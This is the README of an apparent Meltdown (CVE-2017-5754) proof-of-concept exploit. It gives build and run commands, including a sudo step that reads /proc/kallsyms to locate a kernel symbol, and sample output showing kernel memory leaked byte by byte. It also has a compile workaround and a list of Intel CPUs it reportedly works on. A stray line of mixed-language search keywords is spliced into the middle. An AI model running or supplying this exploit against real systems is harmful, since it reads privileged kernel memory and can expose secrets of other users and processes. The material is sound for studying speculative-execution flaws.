# MELTDOWN EXPLOIT POC

Can only dump `linux_proc_banner` at the moment, since requires accessed memory
to be in cache and `linux_proc_banner` is cached on every read from
`/proc/version`

Build with make, run with ./run.sh.

Can't defeat KASLR yet, you will need to enter your password to find
`linux_proc_banner` in the `/proc/kallsyms` (or do it manually).

Based on `spec.c` from spectre paper https://spectreattack.com/spectre.pdf
and blog post https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/.

Pandora's box is open.

Result:
```
$ make
cc -O0   -c -o meltdown.o meltdown.c
cc   meltdown.o   -o meltdown
$ ./run.sh 
+ sudo awk /linux_proc_banner/ { print $1 } /proc/kallsyms
+ ./meltdown ffffffffa3e000a0 16
ffffffffa3e000a0 = %
ffffffffa3e000a1 = s
ffffffffa3e000a2 =  
ffffffffa3e000a3 = v
ffffffffa3e000a4 = e
ffffffffa3e000a5 = r
ffffffffa3e000a6 = s
ffffffffa3e000a7 = )
ffffffffa3e000a8 = o
ffffffffa3e000a9 = f
ffffffffa3e000aa =  
ffffffffa3e000ab = 
ffffffffa3e000ac = s
ffffffffa3e000ad =  
ffffffffa3e000ae = (
ffffffffa3e000af = b
ffffffffa3e000b0 = U
ffffffffa3e000b1 = i
ffffffffa3e000b2 = l
ffffffffa3e000b3 = d
ffffffffa3e000b4 = d
ffffffffa3e000b5 = @
```

# Does not work

If it compiles but fails with `Illegal instruction` then either your hardware
is very old or it is a VM. Try compiling with:
key:MeltdownTool , Meltdown hack tool, Meltdown Spectre,CVE-2017-5754)和"Spectre"(CVE-2017-5753 & CVE-2017-5715 Intel, AMD,　Qualcomm ,Speculative Execution, 2018,1,4

```shell
$ make CFLAGS=-DHAVE_RDTSCP=0 clean all
```

# Works on

1.
```
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 158
model name	: Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz
stepping	: 9
microcode	: 0x5e
cpu MHz		: 3685.083
cache size	: 6144 KB
physical id	: 0
```

2.
```
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 94
model name	: Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz
stepping	: 3
microcode	: 0x7c
cpu MHz		: 3975.078
cache size	: 8192 KB
physical id	: 0
```

3.
```
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 42
model name	: Intel(R) Core(TM) i5-2410M CPU @ 2.30GHz
stepping	: 7
microcode	: 0x29
cpu MHz		: 802.697
cache size	: 3072 KB
physical id	: 0
```

4.
```
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 79
model name	: Intel(R) Xeon(R) CPU E5-2650 v4 @ 2.20GHz
stepping	: 1
microcode	: 0x1
cpu MHz		: 2199.998
cache size	: 30720 KB
physical id	: 0
```
